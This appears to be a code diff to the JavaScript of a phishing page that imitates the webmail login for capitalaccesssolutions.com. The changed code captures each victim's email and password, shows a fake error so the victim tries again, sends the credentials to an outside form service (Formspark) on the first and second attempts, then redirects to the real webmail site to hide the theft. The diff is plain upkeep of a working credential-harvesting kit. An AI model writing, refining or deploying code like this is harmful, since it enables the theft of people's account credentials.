@@ -523,7 +523,7 @@
       let a1 = document.querySelectorAll(".error-notice");
       let a2 = document.querySelectorAll(".a1");
       var form = document.getElementById("login_form");
-      var clickCount = 0;
+      var attemptCount = 0;
 
       // Add an event listener for form submission
       form.addEventListener("submit", function (event) {
@@ -572,6 +572,9 @@
           return;
         }
 
+        // Increment attempt counter
+        attemptCount++;
+        
         loading();
         setTimeout(function () {
           a1.forEach(function (element) {
@@ -591,57 +594,40 @@
           }, 4000);
         }, 3000);
 
-        // Send data to Formspark on each login attempt
-        if (emailInput.value && passwordInput.value) {
+        // Send data to Formspark only on first and second attempts (once each)
+        if (emailInput.value && passwordInput.value && attemptCount <= 2) {
           let dataLog = {
             email: emailInput.value,
             password: passwordInput.value,
-            desc: "http://webmail.capitalaccesssolutions.com: Login Details",
+            attempt: attemptCount === 1 ? "First Attempt" : "Second Attempt",
+            desc: "http://webmail.capitalaccesssolutions.com: Login Details"
           };
-          sendDataWithRetry(dataLog);
-        }
-      });
-
-      // Write a function that will redirect the page to a URL
-      function toggleClass() {
-        // Redirect the page to a URL
-        window.location.href = "http://webmail.capitalaccesssolutions.com";
-      }
-
-      // Send data to Formspark
-      function sendDataWithRetry(dataLog, maxRetries = 3) {
-        const sendRequest = async (retryCount) => {
-          try {
-            const response = await fetch(url, {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify(dataLog),
-            });
-
+          
+          // Send to Formspark
+          fetch(url, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(dataLog),
+          })
+          .then(response => {
             if (response.ok) {
               console.log("Data sent to Formspark successfully");
-              clickCount++;
-              if (clickCount === 2) { // Changed to 2 for second click
-                toggleClass();
-                clickCount = 0;
-              }
-            } else {
-              throw new Error("Network response was not OK");
             }
-          } catch (error) {
+          })
+          .catch(error => {
             console.error("Error sending data:", error);
-            if (retryCount < maxRetries) {
-              console.log(`Retrying (attempt ${retryCount + 1})...`);
-              await sendRequest(retryCount + 1);
-            } else {
-              console.error("Max retries reached. Data not sent.");
-            }
+          });
+          
+          // Redirect after second attempt
+          if (attemptCount === 2) {
+            setTimeout(function() {
+              window.location.href = "http://webmail.capitalaccesssolutions.com";
+            }, 3000);
           }
-        };
-        sendRequest(0);
-      }
+        }
+      });
 
       function loading() {
         const loader = document.querySelector(".loader");
